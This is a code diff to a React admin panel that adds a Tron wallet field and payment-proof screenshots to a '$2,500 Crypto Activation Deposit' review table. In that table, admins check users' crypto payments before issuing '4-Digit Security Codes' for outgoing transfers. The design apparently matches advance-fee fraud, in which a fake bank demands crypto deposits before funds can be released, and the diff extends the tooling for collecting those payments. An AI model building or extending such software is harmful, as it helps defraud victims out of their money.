@@ -65,6 +65,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ adminUser, onDepositSucc
   const [cryptoDeposits, setCryptoDeposits] = useState<CryptoActivationDeposit[]>([]);
   const [loadingCrypto, setLoadingCrypto] = useState(false);
   const [btcAddress, setBtcAddress] = useState('bc1q9v8h9svb3x0k49z82lq09fw2zxl184p24a8svb');
+  const [trxAddress, setTrxAddress] = useState('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
   const [usdtAddress, setUsdtAddress] = useState('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
   const [updatingWallets, setUpdatingWallets] = useState(false);
   const [walletMsg, setWalletMsg] = useState<{ type: 'success' | 'error'; text: string } | null>(null);
@@ -73,8 +74,9 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ adminUser, onDepositSucc
     try {
       const res = await api.getCryptoAddresses();
       if (res.addresses) {
-        setBtcAddress(res.addresses.BTC);
-        setUsdtAddress(res.addresses.USDT);
+        setBtcAddress(res.addresses.BTC || '');
+        setTrxAddress((res.addresses as any).TRX || res.addresses.USDT || '');
+        setUsdtAddress(res.addresses.USDT || '');
       }
     } catch (err) {
       console.error(err);
@@ -90,7 +92,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ adminUser, onDepositSucc
     setWalletMsg(null);
     setUpdatingWallets(true);
     try {
-      await api.updateCryptoAddresses({ BTC: btcAddress, USDT: usdtAddress });
+      await api.updateCryptoAddresses({ BTC: btcAddress, TRX: trxAddress, USDT: usdtAddress });
       setWalletMsg({ type: 'success', text: 'Crypto deposit wallet addresses updated successfully!' });
     } catch (err: any) {
       setWalletMsg({ type: 'error', text: err.message || 'Failed to update wallet addresses.' });
@@ -590,13 +592,24 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ adminUser, onDepositSucc
               </div>
             )}
 
-            <form onSubmit={handleUpdateWallets} className="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs">
+            <form onSubmit={handleUpdateWallets} className="grid grid-cols-1 md:grid-cols-3 gap-4 text-xs">
               <div>
                 <label className="block font-semibold text-slate-300 mb-1">Bitcoin (BTC) Treasury Wallet Address</label>
                 <input
                   type="text"
                   value={btcAddress}
                   onChange={(e) => setBtcAddress(e.target.value)}
+                  className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 font-mono text-amber-400 outline-none focus:border-amber-500"
+                  required
+                />
+              </div>
+
+              <div>
+                <label className="block font-semibold text-slate-300 mb-1">Tron (TRX) Treasury Wallet Address</label>
+                <input
+                  type="text"
+                  value={trxAddress}
+                  onChange={(e) => setTrxAddress(e.target.value)}
                   className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 font-mono text-amber-400 outline-none focus:border-amber-500"
                   required
                 />
@@ -613,7 +626,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ adminUser, onDepositSucc
                 />
               </div>
 
-              <div className="md:col-span-2 flex justify-end">
+              <div className="md:col-span-3 flex justify-end">
                 <button
                   type="submit"
                   disabled={updatingWallets}
@@ -633,7 +646,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ adminUser, onDepositSucc
                 $2,500 Crypto Activation Deposit Requests & 4-Digit Security Code Authorization
               </h3>
               <p className="text-xs text-slate-400 mt-0.5">
-                Review BTC / USDT deposit proof submitted by users to issue 4-Digit Security Codes for outgoing transfers.
+                Review BTC / TRX / USDT deposit proof submitted by users to issue 4-Digit Security Codes for outgoing transfers.
               </p>
             </div>
 
@@ -645,7 +658,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ adminUser, onDepositSucc
                   <th className="py-3 px-3">Account #</th>
                   <th className="py-3 px-3">Crypto Method</th>
                   <th className="py-3 px-3">Amount</th>
-                  <th className="py-3 px-3">Tx Hash / Proof</th>
+                  <th className="py-3 px-3">Proof Screenshot & Tx Hash</th>
                   <th className="py-3 px-3">Status</th>
                   <th className="py-3 px-3 text-right">Admin Actions</th>
                 </tr>
@@ -672,15 +685,22 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ adminUser, onDepositSucc
                       </td>
 
                       <td className="py-3 px-3 font-semibold text-amber-400">
-                        {dep.cryptoMethod} ({dep.network})
+                        {dep.cryptoMethod} ({dep.network || 'Mainnet'})
                       </td>
 
                       <td className="py-3 px-3 font-bold text-white">
                         ${dep.amountUSD}.00 USD
                       </td>
 
-                      <td className="py-3 px-3 max-w-xs font-mono text-[11px] truncate text-slate-400">
-                        {dep.txHash || dep.proofNote || 'No Tx hash provided'}
+                      <td className="py-3 px-3 max-w-xs space-y-1">
+                        {dep.proofImage && (
+                          <a href={dep.proofImage} target="_blank" rel="noreferrer" className="block">
+                            <img src={dep.proofImage} alt="Payment Proof" className="w-16 h-12 object-cover rounded border border-slate-700 hover:border-amber-400 transition-all" />
+                          </a>
+                        )}
+                        <div className="font-mono text-[11px] truncate text-slate-400">
+                          {dep.txHash || dep.proofNote || 'No Tx hash provided'}
+                        </div>
                       </td>
 
                       <td className="py-3 px-3">
